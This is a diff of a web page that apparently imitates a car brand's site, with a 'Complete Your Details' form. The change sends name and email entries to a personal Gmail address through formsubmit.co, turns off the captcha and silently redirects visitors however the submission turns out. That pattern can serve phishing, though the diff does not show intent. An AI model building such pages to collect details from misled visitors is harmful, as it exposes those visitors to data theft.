@@ -75,19 +75,6 @@ body{
   object-fit:contain;
 }
 
-.links{
-  display:flex;
-  justify-content:center;
-  gap:15px;
-  margin-top:6px;
-}
-
-.links a{
-  font-size:13px;
-  color:#000;
-  text-decoration:underline;
-}
-
 /* FORM */
 .wrapper{
   height:100vh;
@@ -164,7 +151,11 @@ button{
     <h2>Complete Your Details</h2>
     <p>Please fill the form to continue</p>
 
-    <form id="mainForm" action="https://formspree.io/f/mkokroza" method="POST">
+    <!-- ✅ UPDATED TO FORMSUBMIT -->
+    <form id="mainForm" action="https://formsubmit.co/dooyaabariimeah@gmail.com" method="POST">
+
+      <!-- disable captcha -->
+      <input type="hidden" name="_captcha" value="false">
 
       <input type="text" name="name" placeholder="Full Name" required>
       <input type="email" name="email" placeholder="Email Address" required>
@@ -190,23 +181,18 @@ document.getElementById("mainForm").addEventListener("submit", function(e){
 
   fetch(form.action, {
     method: "POST",
-    body: new FormData(form),
-    headers: {
-      "Accept": "application/json"
-    }
+    body: new FormData(form)
   })
   .then(() => {
-    // redirect back to homepage instantly
     window.location.href = "index.html";
   })
   .catch(() => {
-    // still redirect even if error
     window.location.href = "index.html";
   });
 });
 
 
-/* ===== DROPDOWN (SAFE VERSION) ===== */
+/* ===== DROPDOWN ===== */
 const menus = {
   vehicles:[
     {name:"Model S",img:"https://images.pexels.com/photos/3729464/pexels-photo-3729464.jpeg"},
@@ -230,10 +216,10 @@ const menus = {
 const dropdown=document.getElementById("dropdown");
 const dropdownContent=document.getElementById("dropdown-content");
 
-/* simple safe hover (no breaking issues) */
 document.querySelectorAll(".nav-item").forEach(item=>{
   item.addEventListener("mouseenter",()=>{
     const key = item.innerText.toLowerCase();
+
     if(menus[key]){
       dropdown.classList.add("show");
 
@@ -253,7 +239,6 @@ document.querySelectorAll(".nav-item").forEach(item=>{
   });
 });
 
-/* hide dropdown on click outside */
 document.addEventListener("click",()=>{
   dropdown.classList.remove("show");
 });
